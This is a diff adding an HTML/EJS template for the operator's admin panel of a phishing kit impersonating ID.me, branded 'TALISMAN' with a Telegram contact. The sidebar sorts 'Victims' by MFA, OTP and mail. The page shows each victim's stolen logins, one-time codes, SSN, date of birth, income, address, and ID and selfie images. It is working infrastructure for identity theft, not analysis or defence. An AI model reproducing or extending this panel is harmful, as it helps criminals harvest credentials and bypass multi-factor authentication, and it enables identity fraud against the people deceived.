@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr" data-nav-layout="vertical" data-theme-mode="light" data-header-styles="light"
+    data-menu-styles="dark" data-toggled="close">
+
+<head>
+
+    <!-- Meta Data -->
+    <meta charset="UTF-8">
+    <meta name='viewport' content='width=device-width, initial-scale=1.0, user-scalable=no'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title> ID.me - Admin Panel</title>
+    <meta name="keywords"
+        content="admin,admin dashboard,admin panel,admin template,bootstrap,clean,dashboard,flat,jquery,modern,responsive,premium admin templates,responsive admin,ui,ui kit.">
+
+    <!-- Favicon -->
+    <link rel="icon" href="/assets/images/brand-logos/favicon.ico" type="image/x-icon">
+
+    <!-- Choices JS -->
+    <script src="/assets/libs/choices.js/public/assets/scripts/choices.min.js"></script>
+
+    <!-- Main Theme Js -->
+    <script src="/assets/js/main.js"></script>
+
+    <!-- Bootstrap Css -->
+    <link id="style" href="/assets/libs/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Style Css -->
+    <link href="/assets/css/styles.min.css" rel="stylesheet">
+
+    <!-- Icons Css -->
+    <link href="/assets/css/icons.css" rel="stylesheet">
+
+    <!-- Node Waves Css -->
+    <link href="/assets/libs/node-waves/waves.min.css" rel="stylesheet">
+
+    <!-- Simplebar Css -->
+    <link href="/assets/libs/simplebar/simplebar.min.css" rel="stylesheet">
+
+    <!-- Color Picker Css -->
+    <link rel="stylesheet" href="/assets/libs/flatpickr/flatpickr.min.css">
+    <link rel="stylesheet" href="/assets/libs/@simonwep/pickr/themes/nano.min.css">
+
+    <!-- Choices Css -->
+    <link rel="stylesheet" href="/assets/libs/choices.js/public/assets/styles/choices.min.css">
+
+
+    <link rel="stylesheet" href="/assets/libs/jsvectormap/css/jsvectormap.min.css">
+
+    <link rel="stylesheet" href="/assets/libs/swiper/swiper-bundle.min.css">
+
+</head>
+
+<body>
+
+
+
+    <div class="page">
+        <!-- app-header -->
+        <header class="app-header">
+
+            <!-- Start::main-header-container -->
+            <div class="main-header-container container-fluid">
+
+                <!-- Start::header-content-left -->
+                <div class="header-content-left">
+
+                    <!-- Start::header-element -->
+                    <div class="header-element">
+                        <div class="horizontal-logo">
+                            <a href="https://t.me/talisman_development" class="header-logo">
+                                TALISMAN &copy;
+                            </a>
+                        </div>
+                    </div>
+                    <!-- End::header-element -->
+
+                    <!-- Start::header-element -->
+                    <div class="header-element">
+                        <!-- Start::header-link -->
+                        <a aria-label="Hide Sidebar"
+                            class="sidemenu-toggle header-link animated-arrow hor-toggle horizontal-navtoggle"
+                            data-bs-toggle="sidebar" href="javascript:void(0);"><span></span></a>
+                        <!-- End::header-link -->
+                    </div>
+                    <!-- End::header-element -->
+
+                </div>
+                <!-- End::header-content-left -->
+
+                <!-- Start::header-content-right -->
+                <div class="header-content-right">
+
+                    <!-- Start::header-element -->
+                    <div class="header-element header-search">
+                        <!-- Start::header-link -->
+                        <a href="javascript:void(0);" class="header-link" data-bs-toggle="modal"
+                            data-bs-target="#searchModal">
+                            <i class="bx bx-search-alt-2 header-link-icon"></i>
+                        </a>
+                        <!-- End::header-link -->
+                    </div>
+                    <!-- End::header-element -->
+
+
+                    <!-- Start::header-element -->
+                    <div class="header-element">
+                        <!-- Start::header-link|dropdown-toggle -->
+                        <a href="#" class="header-link dropdown-toggle" id="mainHeaderProfile" data-bs-toggle="dropdown"
+                            data-bs-auto-close="outside" aria-expanded="false">
+                            <div class="d-flex align-items-center">
+                                <div class="me-sm-2 me-0">
+                                    <img src="/assets/tl-logo.jpg" alt="img" width="32" height="32"
+                                        class="rounded-circle">
+                                </div>
+                                <div class="d-sm-block d-none">
+                                    <p class="fw-semibold mb-0 lh-1">
+                                        <%= username %>
+                                    </p>
+                                    <span class="op-7 fw-normal d-block fs-11">Administrator</span>
+                                </div>
+                            </div>
+                        </a>
+                        <!-- End::header-link|dropdown-toggle -->
+                        <ul class="main-header-dropdown dropdown-menu pt-0 overflow-hidden header-profile-dropdown dropdown-menu-end"
+                            aria-labelledby="mainHeaderProfile">
+                            <li>
+                                <form action="/admin/logout" method="post">
+                                    <button class="dropdown-item d-flex" type="submit"><i
+                                            class="ti ti-logout fs-18 me-2 op-7"></i>Log Out</button>
+                                </form>
+                            </li>
+                        </ul>
+                    </div>
+                    <!-- End::header-element -->
+
+
+                </div>
+                <!-- End::header-content-right -->
+
+            </div>
+            <!-- End::main-header-container -->
+
+        </header>
+        <!-- /app-header -->
+        <!-- Start::app-sidebar -->
+        <aside class="app-sidebar sticky" id="sidebar">
+
+            <!-- Start::main-sidebar-header -->
+            <div class="main-sidebar-header">
+                <a href="https://t.me/talisman_development" class="header-logo text-white">
+                    TALISMAN &copy;
+                </a>
+            </div>
+            <!-- End::main-sidebar-header -->
+
+            <!-- Start::main-sidebar -->
+            <div class="main-sidebar" id="sidebar-scroll">
+
+                <!-- Start::nav -->
+                <nav class="main-menu-container nav nav-pills flex-column sub-open">
+                    <div class="slide-left" id="slide-left">
+                        <svg xmlns="http://www.w3.org/2000/svg" fill="#7b8191" width="24" height="24"
+                            viewBox="0 0 24 24">
+                            <path d="M13.293 6.293 7.586 12l5.707 5.707 1.414-1.414L10.414 12l4.293-4.293z"></path>
+                        </svg>
+                    </div>
+                    <ul class="main-menu">
+                        <!-- Start::slide__category -->
+                        <li class="slide__category"><span class="category-name">Main</span></li>
+                        <!-- End::slide__category -->
+
+                        <!-- Start::slide -->
+                        <li class="slide has-sub">
+                            <a href="javascript:void(0);" class="side-menu__item">
+                                <i class="bx bx-home side-menu__icon"></i>
+                                <span class="side-menu__label">Dashboards</span>
+                                <i class="fe fe-chevron-right side-menu__angle"></i>
+                            </a>
+                            <ul class="slide-menu child1">
+                                <li class="slide side-menu__label1">
+                                    <a href="javascript:void(0)">Dashboards</a>
+                                </li>
+                                <li class="slide">
+                                    <a href="/admin/dashboard" class="side-menu__item">Main</a>
+                                </li>
+                                <li class="slide">
+                                    <a href="/admin/victims/all" class="side-menu__item">Victims - ALL</a>
+                                </li>
+                                <li class="slide">
+                                    <a href="/admin/victims/mfa" class="side-menu__item">Victims - MFA</a>
+                                </li>
+                                <li class="slide">
+                                    <a href="/admin/victims/otp" class="side-menu__item">Victims - OTP</a>
+                                </li>
+                                <li class="slide">
+                                    <a href="/admin/victims/mail" class="side-menu__item">Victims - MAIL</a>
+                                </li>
+                            </ul>
+                        </li>
+                        <!-- End::slide -->
+                    </ul>
+                    <div class="slide-right" id="slide-right"><svg xmlns="http://www.w3.org/2000/svg" fill="#7b8191"
+                            width="24" height="24" viewBox="0 0 24 24">
+                            <path d="M10.707 17.707 16.414 12l-5.707-5.707-1.414 1.414L13.586 12l-4.293 4.293z"></path>
+                        </svg></div>
+                </nav>
+                <!-- End::nav -->
+
+            </div>
+            <!-- End::main-sidebar -->
+
+        </aside>
+        <!-- End::app-sidebar -->
+
+        <!-- Start::app-content -->
+        <div class="main-content app-content">
+            <div class="container-fluid">
+
+                <!-- Page Header -->
+                <div class="d-md-flex d-block align-items-center justify-content-between my-4 page-header-breadcrumb">
+                    <h1 class="page-title fw-semibold fs-18 mb-0">Victim - #<%= log.id %>
+                    </h1>
+                </div>
+                <!-- Page Header Close -->
+
+                <!-- Start::row-1 -->
+                <div class="row">
+                    
+                    <div class="col-xl-9">
+                        <div class="card custom-card">
+                            <div class="card-header">
+                                <div class="card-title">
+                                    Victim details
+                                </div>
+                            </div>
+                            <div class="card-body">
+                                <table id="datatable-basic" class="table table-bordered text-nowrap" style="width:100%">
+                                    <thead>
+                                        <tr>
+                                            <th>Key</th>
+                                            <th>Value</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody>
+                                        <tr>
+                                            <td>First Login</td>
+                                            <td id="">
+                                                <%= log.first_login %>
+                                            </td>
+                                        </tr>
+                                        <tr>
+                                            <td>Second Login</td>
+                                            <td>
+                                                <%= log.second_login %>
+                                            </td>
+                                        </tr>
+                                        <tr>
+                                            <td>OTP - MFA</td>
+                                            <td>
+                                                <%= log.mfa_code %>
+                                            </td>
+                                        </tr>
+                                        <tr>
+                                            <td>OTP - Phone</td>
+                                            <td>
+                                                <%= log.phone_code %>
+                                            </td>
+                                        </tr>
+                                        <tr>
+                                            <td>OTP - Email</td>
+                                            <td>
+                                                <%= log.email_code %>
+                                            </td>
+                                        </tr>
+                                        <tr>
+                                            <td>First Name</td>
+                                            <td>
+                                                <%= log.first_name %>
+                                            </td>
+                                        </tr>
+                                        <tr>
+                                            <td>Middle Name</td>
+                                            <td>
+                                                <%= log.middle_name %>
+                                            </td>
+                                        </tr>
+                                        <tr>
+                                            <td>Last Name</td>
+                                            <td>
+                                                <%= log.last_name %>
+                                            </td>
+                                        </tr>
+                                        <tr>
+                                            <td>Suffix</td>
+                                            <td>
+                                                <%= log.suffix %>
+                                            </td>
+                                        </tr>
+                                        <tr>
+                                            <td>Date Of Birth</td>
+                                            <td>
+                                                <%= log.date_of_birth %>
+                                            </td>
+                                        </tr>
+                                        <tr>
+                                            <td>Social Security Number</td>
+                                            <td>
+                                                <%= log.ssn %>
+                                            </td>
+                                        </tr>
+                                        <tr>
+                                            <td>Average Gross Income</td>
+                                            <td>
+                                                <%= log.agi %>
+                                            </td>
+                                        </tr>
+                                        <tr>
+                                            <td>Street</td>
+                                            <td>
+                                                <%= log.street %>
+                                            </td>
+                                        </tr>
+                                        <tr>
+                                            <td>City</td>
+                                            <td>
+                                                <%= log.city %>
+                                            </td>
+                                        </tr>
+                                        <tr>
+                                            <td>State</td>
+                                            <td>
+                                                <%= log.state %>
+                                            </td>
+                                        </tr>
+                                        <tr>
+                                            <td>Zip Code</td>
+                                            <td>
+                                                <%= log.zip_code %>
+                                            </td>
+                                        </tr>
+                                        <tr>
+                                            <td>ID Front</td>
+                                            <td><a href="/<%= log.id_front %>">
+                                                    <% if(log.id_front) { %>Open Image<%}%>
+                                                </a></td>
+                                        </tr>
+                                        <tr>
+                                            <td>ID Back</td>
+                                            <td><a href="/<%= log.id_back %>">
+                                                    <% if(log.id_back) { %>Open Image<%}%>
+                                                </a></td>
+                                        </tr>
+                                        <tr>
+                                            <td>ID Selfie</td>
+                                            <td><a href="/<%= log.id_selfie %>">
+                                                    <% if(log.id_selfie) { %>Open Image<%}%>
+                                                </a></td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <!--End::row-1 -->
+
+            </div>
+        </div>
+        <!-- End::app-content -->
+
+        <div class="modal fade" id="searchModal" tabindex="-1" aria-labelledby="searchModal" aria-hidden="true">
+            <div class="modal-dialog">
+                <div class="modal-content">
+                    <div class="modal-body">
+                        <div class="input-group">
+                            <a href="javascript:void(0);" class="input-group-text" id="Search-Grid"><i
+                                    class="fe fe-search header-link-icon fs-18"></i></a>
+                            <input type="search" class="form-control border-0 px-2" placeholder="Search"
+                                aria-label="Username">
+                        </div>
+                    </div>
+                    <div class="modal-footer">
+                        <div class="btn-group ms-auto">
+                            <button class="btn btn-sm btn-primary-light">Search</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+    <div class="scrollToTop">
+        <span class="arrow"><i class="ri-arrow-up-s-fill fs-20"></i></span>
+    </div>
+    <div id="responsive-overlay"></div>
+
+    <!-- Popper JS -->
+    <script src="/assets/libs/@popperjs/core/umd/popper.min.js"></script>
+
+    <!-- Bootstrap JS -->
+    <script src="/assets/libs/bootstrap/js/bootstrap.bundle.min.js"></script>
+
+    <!-- Defaultmenu JS -->
+    <script src="/assets/js/defaultmenu.min.js"></script>
+
+    <!-- Node Waves JS-->
+    <script src="/assets/libs/node-waves/waves.min.js"></script>
+
+    <!-- Sticky JS -->
+    <script src="/assets/js/sticky.js"></script>
+
+    <!-- Simplebar JS -->
+    <script src="/assets/libs/simplebar/simplebar.min.js"></script>
+    <script src="/assets/js/simplebar.js"></script>
+
+    <!-- Color Picker JS -->
+    <script src="/assets/libs/@simonwep/pickr/pickr.es5.min.js"></script>
+
+
+    <!-- JSVector Maps JS -->
+    <script src="/assets/libs/jsvectormap/js/jsvectormap.min.js"></script>
+
+    <!-- JSVector Maps MapsJS -->
+    <script src="/assets/libs/jsvectormap/maps/world-merc.js"></script>
+
+    <!-- Apex Charts JS -->
+    <script src="/assets/libs/apexcharts/apexcharts.min.js"></script>
+
+    <!-- Chartjs Chart JS -->
+    <script src="/assets/libs/chart.js/chart.min.js"></script>
+
+    <!-- CRM-Dashboard -->
+    <script src="/assets/js/crm-dashboard.js"></script>
+
+
+    <!-- Custom-Switcher JS -->
+    <script src="/assets/js/custom-switcher.min.js"></script>
+
+    <!-- Custom JS -->
+    <script src="/assets/js/custom.js"></script>
+    <!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.3.2/socket.io.js"></script> -->
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+</body>
+
+</html>
